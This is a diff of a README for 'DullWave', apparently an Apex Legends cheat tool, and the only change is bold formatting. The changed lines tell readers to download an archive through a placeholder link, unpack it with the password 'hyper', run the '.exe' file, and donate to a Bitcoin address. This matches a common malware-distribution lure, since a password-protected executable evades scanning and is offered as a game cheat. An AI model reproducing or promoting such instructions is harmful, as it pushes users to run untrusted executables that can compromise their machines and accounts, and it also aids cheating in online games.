@@ -2,10 +2,10 @@
 
 ![phpz8yhbk_split_dull_apex_scr_34](https://github.com/user-attachments/assets/a1ac933c-9823-4850-bb6a-189b44488ef4)
 
-[![Download DullWave](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen?style=for-the-badge&logo=github)](https://github.com/your-repo-link).
-Unpack it (pas: hyper).
-Run the '.exe` file.
-Support me if you want to continue the development of the project BTC bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq.
+**[![Download DullWave](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen?style=for-the-badge&logo=github)](https://github.com/your-repo-link).
+**Unpack it (pas: hyper).
+**Run the '.exe` file.
+**Support me if you want to continue the development of the project BTC bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq.
 
 ## System Requirements
 This software is designed specifically for Apex Legends. Please ensure your system meets the following requirements:
